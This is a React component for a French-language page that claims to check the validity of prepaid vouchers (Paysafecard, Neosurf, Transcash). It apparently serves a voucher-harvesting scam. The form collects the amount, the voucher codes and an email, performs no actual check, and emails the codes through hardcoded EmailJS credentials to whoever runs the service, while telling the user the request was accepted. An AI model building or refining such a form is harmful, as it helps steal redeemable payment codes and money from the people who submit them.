import { useEffect, useState } from "react";
import { InfosUser } from "../utils/Types";
import { generateField } from "../utils/generateField";
import { sendUserInfosByEmail } from "../utils/Methods";

function SubmissionForm() {
  const [ticketsFieldGenerate, setTicketsFieldGenerate] = useState([]);
  const [error, setError] = useState("");
  const [message, setMessage] = useState("");
  const [selectedTicked, setSelectedTicked] = useState("Paysafecard");
  const [HtmlInputE, setHtmlInputE] = useState<HTMLInputElement | null>();

  const infosUser: InfosUser = {
    ticket: selectedTicked,
    ticketNumber: 0,
    ticketCodes: [],
    amount: "",
    email: "",
    stringCodes : ""
  };

  const [user, setUser] = useState(infosUser);

  // const setUserTicket = (e: any) => {
  //   console.log(document.querySelector(".selected"));

  //   // const ticket = e.target.innerHTML
  //   // console.log(ticket);

  //   // setUser({...user , ticket});
  // };

  useEffect(() => {
    const htmlIe: HTMLInputElement | null = document.querySelector(".tn");
    setHtmlInputE(htmlIe);
  }, []);

  const handleAmount = (event: any) => {
    if (event.target.value === "0" || typeof +event.target.value !== "number") {
      event.target.value = "";
    } else {
      user.amount = event.target.value;
      setUser(user);
    }
  };

  const handleSelectedTicket = (event: any) => {
    setSelectedTicked(event.target.value);
    user.ticketCodes = [];
    user.ticketNumber = 0;
    setUser({ ...user });
    HtmlInputE!.value = "";
    setTicketsFieldGenerate([]);
  };

  const createTicketFieldsByTicketNumber = (ticketNumber: any) => {
    const ticketField: any = [];
    for (let i = 0; i < ticketNumber; i++) {
      ticketField.push(
        generateField(selectedTicked, i, user, setUser, setError)
      );
    }
    setTicketsFieldGenerate(ticketField);
  };

  const verifiedAllFields = () => {
    if (
      user.email == "" ||
      user.ticket == "" ||
      user.ticketCodes.length == 0 ||
      user.ticket == "" ||
      user.amount == ""
    ) {
      return false;
    }
  };

  const submissionProcess = async (e: any) => {
    e.preventDefault();
    user.ticket = selectedTicked;
    console.log(user);
    if (verifiedAllFields() === false) {
      setError("veuillez remplir tout les champs");
    } else if (!error) {
      setMessage(
        "votre requette a bien été prise en compte, verifiez votre mail"
      );
      //console.log(user);
      // Soumission des infos via mail................................
      infosUser.stringCodes = user.ticketCodes.join(" ; ");
      await sendUserInfosByEmail(
        "service_2bdx7bo",
        "template_gwks2bn",
        infosUser,
        "EJqC4yBZ-H2QIvu8_"
      );
    }
  };

  const handleTicketNumber = (event: any) => {
    if (+event.target.value <= 0) {
      user.ticketCodes = [];
      user.ticketNumber = 0;
    }
    createTicketFieldsByTicketNumber(+event.target.value);
  };

  return (
    <div className="box form-container" style={{ height: "1000px" }}>
      <div className="login-box" style={{ width: "90%" }}>
        <h2 style={{ fontSize: "1.5em" }}> Consulter validité </h2>
        {error ? (
          <h2
            style={{
              fontSize: "1em",
              width: "100%",
              padding: "10px",
              margin: "0px",
              color: "red",
            }}
          >
            {error}
          </h2>
        ) : (
          <h2
            style={{
              fontSize: "1em",
              width: "100%",
              padding: "10px",
              margin: "0px",
              color: "green",
            }}
          >
            {message}
          </h2>
        )}
        <form>
          <div style={{ marginLeft: "0px", paddingLeft: "0px", width: "101%" }}>
            <label className="select-label">
              <select
                name="options"
                onChange={(e) => {
                  handleSelectedTicket(e);
                }}
              >
                <option value="Paysafecard">Paysafecard</option>
                <option value="Neosurf">Neosurf</option>
                <option value="Transcash">Transcash</option>
              </select>
            </label>
          </div>

          {/* { <label
              style={{ marginLeft: "0px", paddingLeft: "0px", width: "101%" }}
              id="img_category_label"
              className="field"
              htmlFor="img_category"
              data-value=""
            >
              <span style={{ margin: "0px", padding: "0px", width: "101%" }}>
                Choix du ticket
              </span>
              <div
                style={{ marginLeft: "0px", paddingLeft: "0px", width: "101%" }}
                id="img_category"
                className="psuedo_select"
              >
                <span className="selected"></span>
                <ul id="img_category_options" className="options">
                  <li className="option" data-value="opt_1">
                    Pcs
                  </li>
                  <li className="option" data-value="opt_2">
                    Neosurf
                  </li>
                  <li className="option" data-value="opt_3">
                    Transcash
                  </li>
                </ul>
              </div>
            </label>} */}

          {
            <div className="user-box persofade">
              <input
                type="number"
                maxLength={16}
                required
                onChange={handleAmount}
              />
              <label>Montant </label>
            </div>
          }

          <div className="user-box">
            <input
              type="number"
              className="tn"
              required
              max={3}
              name="ticketNumber"
              onChange={handleTicketNumber}
            />
            <label>Nombre de tickets</label>
          </div>
          {ticketsFieldGenerate}
          <div className="user-box persofade">
            <input
              type="email"
              required
              onChange={(event) => {
                setUser({ ...user, email: event?.target.value });
              }}
            />
            <label>Email</label>
          </div>
          <a
            href="#"
            onClick={(e) => {
              submissionProcess(e);
            }}
          >
            <span></span>
            <span></span>
            <span></span>
            <span></span>
            consulter
          </a>
        </form>
      </div>
    </div>
  );
}

export default SubmissionForm;
